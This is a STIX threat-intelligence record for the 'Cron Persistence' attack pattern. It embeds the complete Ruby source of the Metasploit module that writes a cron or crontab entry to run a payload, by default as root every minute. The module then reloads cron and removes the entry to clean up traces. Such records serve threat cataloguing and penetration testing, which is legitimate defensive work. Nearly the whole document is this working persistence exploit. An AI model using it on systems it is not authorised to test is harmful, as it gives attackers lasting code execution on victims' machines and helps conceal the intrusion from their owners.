{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3a018ac2-6e4b-42ef-bbc2-3dc7ca54c5b0",
    "created": "2024-08-14T16:58:50.526934Z",
    "modified": "2024-08-14T16:58:50.526951Z",
    "name": "Cron Persistence",
    "description": "( This module will create a cron or crontab entry to execute a payload. The module includes the ability to automatically clean up those entries to prevent multiple executions. syslog will get a copy of the cron entry. ) 'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/local/cron_persistence.rb",
            "external_id": "cron_persistence.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::File\n  include Msf::Post::Unix\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name'           => 'Cron Persistence',\n        'Description'    => %q(\n          This module will create a cron or crontab entry to execute a payload.\n          The module includes the ability to automatically clean up those entries to prevent multiple executions.\n          syslog will get a copy of the cron entry.\n        ),\n        'License'        => MSF_LICENSE,\n        'Author'         =>\n          [\n            'h00die <mike@shorebreaksecurity.com>'\n          ],\n        'Platform'       => ['unix', 'linux'],\n        'Targets'        =>\n          [\n            [ 'Cron',           { :path => '/etc/cron.d' } ],\n            [ 'User Crontab',   { :path => '/var/spool/cron' } ],\n            [ 'System Crontab', { :path => '/etc' } ]\n          ],\n        'DefaultTarget'  => 1,\n        'Arch'           => ARCH_CMD,\n        'Payload'        =>\n        {\n          'BadChars'   => \"#%\\x10\\x13\", # is for comments, % is for newline\n          'Compat'     =>\n          {\n            'PayloadType'  => 'cmd',\n            'RequiredCmd'  => 'generic perl ruby python'\n          }\n        },\n        'DefaultOptions' => { 'WfsDelay' => 90 },\n        'DisclosureDate' => '1979-07-01' # Version 7 Unix release date (first cron implementation)\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('USERNAME', [false, 'User to run cron/crontab as', 'root']),\n        OptString.new('TIMING', [false, 'cron timing.  Changing will require WfsDelay to be adjusted', '* * * * *']),\n        OptBool.new('CLEANUP', [true, 'delete cron entry after execution', true])\n      ], self.class\n    )\n  end\n\n  def exploit\n    # https://gist.github.com/istvanp/310203 for cron regex validator\n    cron_regex = '(\\*|[0-5]?[0-9]|\\*\\/[0-9]+)\\s+'\n    cron_regex << '(\\*|1?[0-9]|2[0-3]|\\*\\/[0-9]+)\\s+'\n    cron_regex << '(\\*|[1-2]?[0-9]|3[0-1]|\\*\\/[0-9]+)\\s+'\n    cron_regex << '(\\*|[0-9]|1[0-2]|\\*\\/[0-9]+|jan|feb|mar|apr|may|jun|jul|aug|sep|oct|nov|dec)\\s+'\n    cron_regex << '(\\*\\/[0-9]+|\\*|[0-7]|sun|mon|tue|wed|thu|fri|sat)' # \\s*\n    # cron_regex << '(\\*\\/[0-9]+|\\*|[0-9]+)?'\n    unless datastore['TIMING'] =~ /#{cron_regex}/\n      fail_with(Failure::BadConfig, 'Invalid timing format')\n    end\n    cron_entry = datastore['TIMING']\n    if target.name.include? 'User Crontab'\n      unless user_cron_permission?(datastore['USERNAME'])\n        fail_with(Failure::NoAccess, 'User denied cron via cron.deny')\n      end\n    else\n      cron_entry += \" #{datastore['USERNAME']}\"\n    end\n    flag = Rex::Text.rand_text_alpha(10)\n    cron_entry += \" #{payload.encoded} ##{flag}\" # we add a flag to the end of the entry to potentially delete it later\n    case target.name\n    when 'Cron'\n      our_entry = Rex::Text.rand_text_alpha(10)\n      write_file(\"#{target.opts[:path]}/#{our_entry}\", \"#{cron_entry}\\n\")\n      vprint_good(\"Writing #{cron_entry} to #{target.opts[:path]}/#{our_entry}\")\n      if datastore['CLEANUP']\n        register_file_for_cleanup(\"#{target.opts[:path]}/#{our_entry}\")\n      end\n    when 'System Crontab'\n      file_to_clean = \"#{target.opts[:path]}/crontab\"\n      append_file(file_to_clean, \"\\n#{cron_entry}\\n\")\n      vprint_good(\"Writing #{cron_entry} to #{file_to_clean}\")\n    when 'User Crontab'\n      file_to_clean = \"#{target.opts[:path]}/crontabs/#{datastore['USERNAME']}\"\n      append_file(file_to_clean, \"\\n#{cron_entry}\\n\")\n      vprint_good(\"Writing #{cron_entry} to #{file_to_clean}\")\n      # at least on ubuntu, we need to reload cron to get this to work\n      vprint_status('Reloading cron to pickup new entry')\n      cmd_exec(\"service cron reload\")\n    end\n    print_status(\"Waiting #{datastore['WfsDelay']}sec for execution\")\n    Rex.sleep(datastore['WfsDelay'].to_i)\n    # we may need to do some cleanup, no need for cron since that uses file dropper\n    # we could run this on a on_successful_session, but we want cleanup even if it fails\n    if file_to_clean && flag && datastore['CLEANUP']\n      print_status(\"Removing our cron entry from #{file_to_clean}\")\n      cmd_exec(\"sed '/#{flag}$/d' #{file_to_clean} > #{file_to_clean}.new\")\n      cmd_exec(\"mv #{file_to_clean}.new #{file_to_clean}\")\n      # replaced cmd_exec(\"perl -pi -e 's/.*#{flag}$//g' #{file_to_clean}\") in favor of sed\n      if target.name == 'User Crontab' # make sure we clean out of memory\n        cmd_exec(\"service cron reload\")\n      end\n    end\n  end\n\n  def user_cron_permission?(user)\n    # double check we're allowed to do cron\n    # may also be /etc/cron.d/\n    paths = ['/etc/', '/etc/cron.d/']\n    paths.each do |path|\n      cron_auth = read_file(\"#{path}cron.allow\")\n      if cron_auth\n        if cron_auth =~ /^ALL$/ || cron_auth =~ /^#{Regexp.escape(user)}$/\n          vprint_good(\"User located in #{path}cron.allow\")\n          return true\n        end\n      end\n      cron_auths = read_file(\"#{path}cron.deny\")\n      if cron_auths && cron_auth =~ /^#{Regexp.escape(user)}$/\n        vprint_error(\"User located in #{path}cron.deny\")\n        return false\n      end\n    end\n    # no guidance, so we should be fine\n    true\n  end\nend\n",
    "x_mitre_disclosure_date": "1979-07-01 # Version 7 Unix release date first cron implementation",
    "x_mitre_platforms": [
        "['unix', 'linux']"
    ]
}